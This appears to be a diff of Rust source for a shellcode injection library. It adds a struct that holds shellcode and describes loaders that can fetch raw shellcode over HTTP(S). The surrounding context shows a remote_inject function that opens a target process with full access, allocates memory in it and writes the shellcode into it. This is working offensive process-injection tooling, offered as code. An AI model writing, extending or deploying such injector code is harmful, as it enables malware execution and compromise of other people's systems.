@@ -42,6 +42,16 @@ use reqwest::blocking::get;
 use base64::{Engine as _, engine::general_purpose};
 
 ///
+/// A handy container for our shellcode. This is [InjectionType] and 
+/// [InjectorType] agnostic, beacuse our helpful [load()] function will
+/// handle the transformation from source to shellcode.
+/// 
+pub struct Injector {
+    pub shellcode: Vec<u8>
+}
+
+
+///
 /// The possible types of shellcode loaders. They are:
 /// 
 /// * `Url`: Raw Shellcode over HTTP(S)
@@ -144,7 +154,7 @@ pub unsafe fn remote_inject(sc: &Vec<u8>, wait: bool, process_name: &str) -> Res
         .filter(|(&_pid, &ref proc)| proc.name() == process_name );
 
     match process_matches.nth(0) {
-        Some((pid, proc)) => {
+        Some((pid, _proc)) => {
             let h: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32()).unwrap();
             let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);              
             write_mem(sc, h, addr, wait)
